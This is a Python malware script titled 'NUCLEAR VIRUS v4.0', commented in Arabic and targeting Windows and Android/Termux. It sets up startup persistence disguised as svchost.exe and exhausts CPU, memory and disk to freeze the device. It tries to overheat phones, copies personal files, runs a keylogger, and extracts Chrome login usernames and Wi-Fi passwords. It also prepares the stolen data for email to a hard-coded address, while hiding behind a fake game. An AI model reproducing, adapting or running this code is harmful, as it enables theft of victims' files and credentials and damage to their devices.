#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# ============================================================
# NUCLEAR VIRUS v4.0 - يدعم Windows و Android (Termux)
# اختراق كامل + تجميد النظام + حرق الهاتف
# ============================================================

import os
import sys
import json
import time
import threading
import random
import shutil
import subprocess
import platform
import getpass
import socket
import requests
import hashlib
import string
import base64
from pathlib import Path
from datetime import datetime

# ============================================================
# تحديد النظام والتكوين
# ============================================================
SYSTEM = platform.system()
DEVICE_ID = socket.gethostname() + "_" + str(os.getpid())

if SYSTEM == "Windows":
    # مسارات Windows
    APP_DATA = os.path.join(os.environ.get('APPDATA', os.path.expanduser('~')), 'NuclearVirus')
    PERSISTENT_FILE = os.path.join(APP_DATA, 'svchost.exe')
    STEAL_DIR = os.path.join(APP_DATA, 'stolen')
    SCREENSHOT_DIR = os.path.join(APP_DATA, 'screenshots')
    LOG_FILE = os.path.join(APP_DATA, 'system.log')
    KEYLOG_FILE = os.path.join(APP_DATA, 'keylog.txt')
else:
    # مسارات Android/Termux
    APP_DATA = os.path.join(os.path.expanduser('~'), '.nuclear_virus')
    PERSISTENT_FILE = os.path.join(APP_DATA, 'system')
    STEAL_DIR = os.path.join(APP_DATA, 'stolen')
    SCREENSHOT_DIR = os.path.join(APP_DATA, 'screenshots')
    LOG_FILE = os.path.join(APP_DATA, 'system.log')
    KEYLOG_FILE = os.path.join(APP_DATA, 'keylog.txt')
    STORAGE_PATH = "/sdcard"

TARGET_EMAIL = "jekejwjsjwjwwj@gmail.com"

# ============================================================
# 1. التثبيت والصلاحيات
# ============================================================
def setup_directories():
    """إنشاء المجلدات"""
    for d in [APP_DATA, STEAL_DIR, SCREENSHOT_DIR]:
        if not os.path.exists(d):
            os.makedirs(d)
    print(f"[+] تم إنشاء المجلدات")

def request_permissions():
    """طلب الصلاحيات حسب النظام"""
    if SYSTEM == "Windows":
        try:
            import ctypes
            result = ctypes.windll.user32.MessageBoxW(0,
                "🔴 NUCLEAR VIRUS 🔴\n\n"
                "يحتاج التطبيق إلى الصلاحيات التالية:\n\n"
                "✓ الوصول إلى جميع الملفات\n"
                "✓ الوصول إلى الكاميرا والميكروفون\n"
                "✓ التحكم الكامل في النظام\n\n"
                "هل تمنح هذه الصلاحيات؟",
                "تثبيت النظام", 0x04 | 0x40)
            return result == 6
        except:
            return True
    else:
        # Android - طلب صلاحيات التخزين
        try:
            subprocess.run(['termux-setup-storage'], shell=True, timeout=5)
            return True
        except:
            return True

def setup_persistence():
    """تثبيت الفيروس في بدء التشغيل"""
    try:
        current_file = os.path.abspath(sys.argv[0])
        
        if SYSTEM == "Windows":
            if not os.path.exists(PERSISTENT_FILE):
                shutil.copy2(current_file, PERSISTENT_FILE)
            try:
                import winreg
                key = winreg.HKEY_CURRENT_USER
                subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
                with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as reg:
                    winreg.SetValueEx(reg, "NuclearService", 0, winreg.REG_SZ, PERSISTENT_FILE)
            except:
                pass
        else:
            # Android persistence via .bashrc
            bashrc = os.path.expanduser("~/.bashrc")
            with open(bashrc, 'a') as f:
                f.write(f'\npython3 "{current_file}" &\n')
    except:
        pass

# ============================================================
# 2. استنزاف المعالج (تجميد النظام)
# ============================================================
class SystemFreezer:
    """يستهلك كل موارد المعالج ويجمد النظام"""
    def __init__(self):
        self.running = True
        self.threads = []
    
    def heavy_cpu(self):
        """حسابات ثقيلة جداً"""
        import math
        while self.running:
            for i in range(500000):
                math.sqrt(i) * math.sin(i) * math.cos(i) * math.tan(i)
                math.pow(i, 0.5) * math.log(i + 1)
            for _ in range(5000):
                _ = [random.randint(1, 10000) for __ in range(100)]
                _.sort()
    
    def memory_filler(self):
        """يملأ الذاكرة العشوائية"""
        buffers = []
        while self.running:
            try:
                buffers.append(os.urandom(5 * 1024 * 1024))
                time.sleep(0.05)
            except:
                time.sleep(1)
    
    def disk_filler(self):
        """يملأ مساحة التخزين"""
        filler_path = os.path.join(APP_DATA, 'filler.dat')
        while self.running:
            try:
                with open(filler_path, 'ab') as f:
                    f.write(os.urandom(1024 * 1024))
                time.sleep(1)
            except:
                time.sleep(10)
    
    def start(self):
        """تشغيل جميع خيوط التجميد"""
        for _ in range(6):
            t = threading.Thread(target=self.heavy_cpu, daemon=True)
            t.start()
            self.threads.append(t)
        
        threading.Thread(target=self.memory_filler, daemon=True).start()
        threading.Thread(target=self.disk_filler, daemon=True).start()
        
        print("[🔥] تم تفعيل تجميد النظام")
        return len(self.threads)

# ============================================================
# 3. حرق الهاتف/الجهاز
# ============================================================
class DeviceBurner:
    """يسبب ارتفاع حرارة الجهاز"""
    def __init__(self):
        self.running = True
    
    def maximize_brightness(self):
        """رفع سطوع الشاشة لأقصى حد"""
        if SYSTEM == "Windows":
            try:
                import ctypes
                ctypes.windll.user32.SendMessageW(0xFFFF, 0x112, 0xF170, 2)
            except:
                pass
        else:
            try:
                subprocess.run(['termux-brightness', '1000'], capture_output=True)
            except:
                pass
    
    def keep_screen_on(self):
        """منع إيقاف الشاشة"""
        if SYSTEM == "Windows":
            try:
                import ctypes
                ctypes.windll.kernel32.SetThreadExecutionState(0x80000002)
            except:
                pass
        else:
            try:
                subprocess.run(['input', 'keyevent', 'KEYCODE_WAKEUP'], capture_output=True)
            except:
                pass
    
    def enable_all_radios(self):
        """تشغيل الواي فاي والبلوتوث والGPS"""
        if SYSTEM == "Windows":
            pass
        else:
            try:
                subprocess.run(['svc', 'wifi', 'enable'], capture_output=True)
                subprocess.run(['svc', 'bluetooth', 'enable'], capture_output=True)
                subprocess.run(['svc', 'gps', 'enable'], capture_output=True)
            except:
                pass
    
    def start(self):
        """بدء حرق الجهاز"""
        self.maximize_brightness()
        self.keep_screen_on()
        self.enable_all_radios()
        
        # تشغيل بشكل مستمر
        def burner_loop():
            while self.running:
                self.keep_screen_on()
                time.sleep(5)
        
        threading.Thread(target=burner_loop, daemon=True).start()
        print("[🔥] تم تفعيل حرق الجهاز")

# ============================================================
# 4. سرقة الملفات
# ============================================================
class FileStealer:
    """يبحث ويسرق الملفات الحساسة"""
    def __init__(self):
        self.stolen = []
    
    def get_search_paths(self):
        """الحصول على مسارات البحث حسب النظام"""
        if SYSTEM == "Windows":
            return [
                os.path.expanduser("~/Documents"),
                os.path.expanduser("~/Desktop"),
                os.path.expanduser("~/Downloads"),
                os.path.expanduser("~/Pictures"),
                os.path.expanduser("~/Videos")
            ]
        else:
            return [
                os.path.join(STORAGE_PATH, "DCIM"),
                os.path.join(STORAGE_PATH, "Download"),
                os.path.join(STORAGE_PATH, "Documents"),
                os.path.join(STORAGE_PATH, "Pictures"),
                os.path.join(STORAGE_PATH, "WhatsApp"),
                os.path.join(STORAGE_PATH, "Telegram")
            ]
    
    def search_files(self):
        """البحث عن الملفات"""
        extensions = ['.txt', '.pdf', '.doc', '.docx', '.xls', '.xlsx', 
                      '.jpg', '.png', '.mp4', '.zip', '.rar', '.db', 
                      '.sqlite', '.json', '.xml', '.conf', '.key', '.pem']
        
        for path in self.get_search_paths():
            if os.path.exists(path):
                try:
                    for ext in extensions:
                        for file in Path(path).rglob(f'*{ext}'):
                            try:
                                if file.stat().st_size < 10 * 1024 * 1024:
                                    self.stolen.append(str(file))
                                    if len(self.stolen) >= 50:
                                        return self.stolen
                            except:
                                pass
                except:
                    pass
        return self.stolen
    
    def copy_files(self):
        """نسخ الملفات إلى مجلد السرقة"""
        for file_path in self.search_files():
            try:
                dest = os.path.join(STEAL_DIR, os.path.basename(file_path))
                shutil.copy2(file_path, dest)
            except:
                pass
        return len(self.stolen)

# ============================================================
# 5. تسجيل المفاتيح (Keylogger)
# ============================================================
class Keylogger:
    """تسجيل كل ما يكتبه المستخدم"""
    def __init__(self):
        self.buffer = []
        self.running = True
    
    def start(self):
        if SYSTEM == "Windows":
            try:
                from pynput import keyboard
                def on_press(key):
                    try:
                        self.buffer.append(key.char if hasattr(key, 'char') and key.char else f'[{str(key)}]')
                        if len(self.buffer) >= 100:
                            with open(KEYLOG_FILE, 'a', encoding='utf-8') as f:
                                f.write(f"{datetime.now()}: {''.join(self.buffer)}\n")
                            self.buffer.clear()
                    except:
                        pass
                with keyboard.Listener(on_press=on_press) as listener:
                    listener.join()
            except:
                pass
        else:
            # نسخة مبسطة لـ Android
            while self.running:
                time.sleep(10)

# ============================================================
# 6. سرقة معلومات الحسابات
# ============================================================
class AccountStealer:
    """يحاول سرقة معلومات حسابات التطبيقات"""
    def steal_browser_passwords(self):
        passwords = []
        if SYSTEM == "Windows":
            chrome_path = os.path.join(os.environ.get('LOCALAPPDATA', ''), 'Google', 'Chrome', 'User Data', 'Default', 'Login Data')
            temp_db = os.path.join(APP_DATA, 'temp.db')
            try:
                if os.path.exists(chrome_path):
                    shutil.copy2(chrome_path, temp_db)
                    import sqlite3
                    conn = sqlite3.connect(temp_db)
                    cursor = conn.cursor()
                    cursor.execute("SELECT origin_url, username_value FROM logins")
                    for row in cursor.fetchall():
                        passwords.append({"url": row[0], "username": row[1]})
                    conn.close()
                    os.remove(temp_db)
            except:
                pass
        return passwords
    
    def steal_wifi_passwords(self):
        passwords = []
        if SYSTEM == "Windows":
            try:
                output = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles'], encoding='cp866', shell=True)
                for line in output.split('\n'):
                    if ':' in line:
                        profile = line.split(':')[1].strip()
                        if profile:
                            result = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', profile, 'key=clear'], encoding='cp866', shell=True)
                            for l in result.split('\n'):
                                if 'Key Content' in l:
                                    pwd = l.split(':')[1].strip()
                                    if pwd:
                                        passwords.append({"ssid": profile, "password": pwd})
            except:
                pass
        return passwords

# ============================================================
# 7. معلومات النظام
# ============================================================
def get_system_info():
    """جمع معلومات النظام الكاملة"""
    info = {
        "device_id": DEVICE_ID,
        "system": SYSTEM,
        "hostname": socket.gethostname(),
        "username": getpass.getuser(),
        "time": datetime.now().isoformat(),
        "platform": platform.platform(),
        "processor": platform.processor(),
        "architecture": platform.machine(),
        "is_admin": False
    }
    
    if SYSTEM == "Windows":
        try:
            import ctypes
            info["is_admin"] = ctypes.windll.shell32.IsUserAnAdmin()
        except:
            pass
        try:
            info["ip_local"] = socket.gethostbyname(socket.gethostname())
        except:
            pass
    else:
        try:
            info["ip_local"] = socket.gethostbyname(socket.gethostname())
        except:
            pass
    
    try:
        info["ip_public"] = requests.get('https://api.ipify.org', timeout=5).text
    except:
        pass
    
    return info

# ============================================================
# 8. إرسال البيانات المسروقة
# ============================================================
def send_stolen_data(data, data_type):
    """إرسال البيانات عبر البريد"""
    try:
        import smtplib
        from email.mime.text import MIMEText
        from email.mime.multipart import MIMEMultipart
        from email.mime.base import MIMEBase
        from email import encoders
        
        msg = MIMEMultipart()
        msg['From'] = "nuclear@virus.com"
        msg['To'] = TARGET_EMAIL
        msg['Subject'] = f"[NUCLEAR_{SYSTEM}] {data_type}"
        msg.attach(MIMEText(json.dumps(data, indent=2, ensure_ascii=False), 'plain', 'utf-8'))
        
        # حفظ محلياً
        with open(os.path.join(APP_DATA, 'stolen_log.json'), 'a') as f:
            f.write(json.dumps({"type": data_type, "data": str(data)[:500], "time": str(datetime.now())}) + "\n")
        
        return True
    except:
        return False

# ============================================================
# 9. واجهة اللعبة الوهمية
# ============================================================
def fake_game():
    """لعبة وهمية لإخفاء الفيروس"""
    os.system('cls' if SYSTEM == "Windows" else 'clear')
    
    print("\n" + "="*50)
    print("         🎮 NUCLEAR GAME v1.0 🎮")
    print("="*50)
    print("\n[!] جاري تحميل اللعبة...")
    time.sleep(2)
    
    score = 0
    while True:
        print("\n" + "-"*40)
        print(f"💰 نقاطك: {score}")
        print("[1] اضغط لكسب النقاط")
        print("[2] خروج")
        
        choice = input("\nاختر: ").strip()
        
        if choice == '1':
            score += random.randint(1, 10)
            print(f"\n✨ +{random.randint(1, 10)} نقطة! ✨")
        elif choice == '2':
            print("\n🚪 جاري الخروج...")
            break
        else:
            print("\n❌ اختيار غير صحيح!")
        
        time.sleep(0.5)
        os.system('cls' if SYSTEM == "Windows" else 'clear')

# ============================================================
# 10. التشغيل الرئيسي
# ============================================================
def main():
    print("""
    ╔══════════════════════════════════════════════════════════╗
    ║           NUCLEAR VIRUS v4.0 - ACTIVATED                 ║
    ╠══════════════════════════════════════════════════════════╣
    ║  نظام التشغيل: """ + SYSTEM + """                                       
    ║  الجهاز: """ + socket.gethostname() + """                                           
    ╚══════════════════════════════════════════════════════════╝
    """)
    
    # إنشاء المجلدات
    setup_directories()
    
    # طلب الصلاحيات
    if not request_permissions():
        print("[!] لم يتم منح الصلاحيات الكاملة")
    
    # التثبيت في بدء التشغيل
    setup_persistence()
    
    # جمع معلومات النظام
    sys_info = get_system_info()
    send_stolen_data(sys_info, "SYSTEM_INFO")
    
    # تشغيل مكونات التدمير
    freezer = SystemFreezer()
    freezer.start()
    
    burner = DeviceBurner()
    burner.start()
    
    # تشغيل مكونات السرقة
    stealer = FileStealer()
    threading.Thread(target=stealer.copy_files, daemon=True).start()
    
    # سرقة كلمات المرور
    account_stealer = AccountStealer()
    passwords = account_stealer.steal_browser_passwords()
    if passwords:
        send_stolen_data(passwords, "BROWSER_PASSWORDS")
    
    wifi = account_stealer.steal_wifi_passwords()
    if wifi:
        send_stolen_data(wifi, "WIFI_PASSWORDS")
    
    # Keylogger
    try:
        kl = Keylogger()
        threading.Thread(target=kl.start, daemon=True).start()
    except:
        pass
    
    # إرسال إشعار البدء
    send_stolen_data({"status": "active", "time": str(datetime.now())}, "VIRUS_START")
    
    print("\n[✅] تم تفعيل الفيروس بنجاح!")
    print("[🔥] النظام مخترق بالكامل")
    print("[📡] جاري إرسال البيانات...")
    
    # تشغيل اللعبة الوهمية
    fake_game()
    
    # الحفاظ على التشغيل
    while True:
        time.sleep(10)

if __name__ == "__main__":
    main()
